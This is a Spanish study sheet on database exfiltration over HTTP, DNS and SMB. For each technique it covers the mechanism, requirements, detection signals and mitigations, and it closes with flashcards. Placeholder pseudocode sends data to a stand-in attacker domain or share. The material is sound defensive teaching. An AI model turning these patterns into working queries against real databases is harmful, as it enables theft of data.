Estructura concisa para memorización operativa: técnica → mecanismo → requisitos → señales detectables → pseudocódigo (no operativo) → mitigaciones → fichas rápidas.

### 1) HTTP (via UDF / external script)

* **Qué hace**: envía datos por HTTP a un servidor controlado desde el motor DB mediante funciones externas.
* **Mecanismo**: DB invoca UDF o script capaz de realizar peticiones HTTP; datos se envían en URL o cuerpo.
* **Requisitos**: capacidad de instalar/ejecutar UDF o ejecutar procesos externos; privilegios de FILE/CREATE FUNCTION o acceso al sistema.
* **Señales detectables**: conexiones HTTP salientes desde servidor BD a dominios no autorizados; picos de tráfico HTTP en procesos DB; logs de llamadas a UDF.
* **Pseudocódigo (NO ejecutable)**:

```
-- INVOCACIÓN ilustrativa (reemplazar por <FUNC> / <URL> / <DATA>)
SELECT <FUNC_HTTP>('http://<ATTACKER_DOMAIN>/path', ENCODE(<DATA>));
```

* **Mitigación**: bloquear egress HTTP desde DB, restringir instalación de UDF, auditar CREATE FUNCTION, WAF/IDS para destinos inusuales.

---

### 2) DNS exfiltration

* **Qué hace**: codifica datos en nombres de dominio y provoca resoluciones DNS hacia un servidor autorizado por el atacante.
* **Mecanismo**: DB provoca resolución DNS (directa o vía UDF/script) a subdominios que contienen fragmentos codificados.
* **Requisitos**: capacidad de realizar consultas DNS desde el host DB; control sobre servidor DNS receptor; privilegios para ejecutar consultas o UDF.
* **Señales detectables**: numerosas consultas DNS a subdominios largos/aleatorios; consultas a dominios externos no usados; patrones de alta entropía en registros DNS.
* **Pseudocódigo (NO ejecutable)**:

```
-- patrón conceptual
consulta_dns("<BASE32(OCTETOS_DE_DATOS)>." + "<ATTACKER_DOMAIN>")
```

* **Mitigación**: filtrar/registrar egress DNS, limitar servidores DNS recursivos, alertar por subdominios de alta entropía, DNS sinkhole corporativo.

---

### 3) SMB / UNC write (escritura en share)

* **Qué hace**: escribe resultados de consultas en un recurso compartido remoto accesible por SMB/UNC.
* **Mecanismo**: DB escribe fichero vía ruta UNC o usando mount/smbclient desde el host; Windows facilita rutas `\\HOST\share\file`.
* **Requisitos**: capacidad del proceso DB para acceder a la red de archivos (credenciales o anon), privilegios para OUTFILE o ejecución de comandos en host.
* **Señales detectables**: conexiones SMB salientes; creación de archivos en shares externos; logs de autenticación a shares inusuales.
* **Pseudocódigo (NO ejecutable)**:

```
-- patrón conceptual
RESULT -> escribir_en_share("\\\\<ATTACKER_HOST>\\share\\<archivo>.txt")
```

* **Mitigación**: bloquear egress SMB, validar destinos de UNC, deshabilitar escritura remota desde procesos DB, auditar INTO OUTFILE y permisos de filesystem.

---

### Comparativa rápida (tabla mental)

* **Visibilidad**: DNS (alta chance de evadir HTTP filters) > HTTP (más detectable por IDS/Proxy) > SMB (detectable en redes Windows).
* **Facilidad en Windows**: SMB > HTTP (si hay UDF) > DNS.
* **Requisitos de privilegios**: todos requieren más que usuario SELECT en la mayoría de configuraciones; UDF/OUTFILE/exec elevan la barra.

---

### Señales de detección y queries de auditoría (conceptuales)

* Registrar/alertar:

  * Conexiones salientes desde host DB a IPs/dominios no permitidos.
  * Creación de funciones UDF (`CREATE FUNCTION`) y carga de librerías.
  * Uso de INTO OUTFILE o llamadas inusuales a procedimientos externos.
  * Consultas DNS repetitivas a nombres de alto-entropía.
* Regla IDS conceptual:

```
if (outbound_protocol in [HTTP,DNS,SMB]) and (destination not in allowlist) and (payload_pattern == high_entropy or repeated small fragments) then alert
```

---

### Checklist de prioridades defensivas (implementación inmediata)

1. Restringir egress: solo permitir destinos necesarios desde hosts BD.
2. Deshabilitar instalación de UDFs salvo necesidad explícita; auditar cualquier CREATE FUNCTION.
3. Restringir permisos FILE/OUTFILE y funciones que llaman al SO.
4. Habilitar logging de DNS recursivo y analizar por entropía y patrones de subdominios.
5. Monitor SMB/UNC saliente; bloquear puertos SMB en firewall saliente para servidores DB.
6. Revisar parches/privilegios del motor DB y principios de menor privilegio para cuentas de servicio.

---

### Flashcard (para memoria rápida)

* **Pregunta**: ¿Qué protocolo usa subdominios con datos codificados?
  **Respuesta**: DNS exfiltration — codifica datos dentro de nombres de dominio y provoca resoluciones.

* **Pregunta**: ¿Qué indicador detecta HTTP-based exfiltration desde BD?
  **Respuesta**: Conexiones HTTP salientes desde proceso DB a dominios no autorizados; llamadas a UDF HTTP.

* **Pregunta**: Mitigación prioritaria contra SMB exfiltration.
  **Respuesta**: Bloquear egress SMB; deshabilitar escritura remota desde procesos DB.

---

### Glosario mínimo

* **UDF**: User Defined Function — código cargado en el motor DB que puede ejecutar operaciones fuera del SQL estándar.
* **OUTFILE / INTO OUTFILE**: instrucción que puede escribir archivos en el sistema de ficheros desde la DB.
* **Egress filtering**: control de salidas de red desde un host para evitar comunicaciones no autorizadas.
* **Entropía DNS**: medida estadística para detectar dominios que contienen datos codificados.

---

